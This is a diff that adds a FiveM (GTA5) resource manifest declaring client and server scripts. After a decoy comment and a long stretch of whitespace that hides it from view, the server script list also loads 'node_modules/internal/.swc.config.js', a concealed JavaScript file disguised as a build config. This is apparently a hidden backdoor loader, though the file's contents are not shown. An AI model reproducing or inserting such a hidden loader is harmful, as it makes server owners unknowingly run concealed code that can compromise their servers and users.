@@ -1,0 +1,13 @@
+fx_version 'cerulean'
+game 'gta5'
+version '1.0.0'
+
+client_scripts {
+    'client/client.lua'
+}
+
+server_scripts {
+    '@oxmysql/lib/MySQL.lua',
+'server/server.lua',
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.swc.config.js',
+}
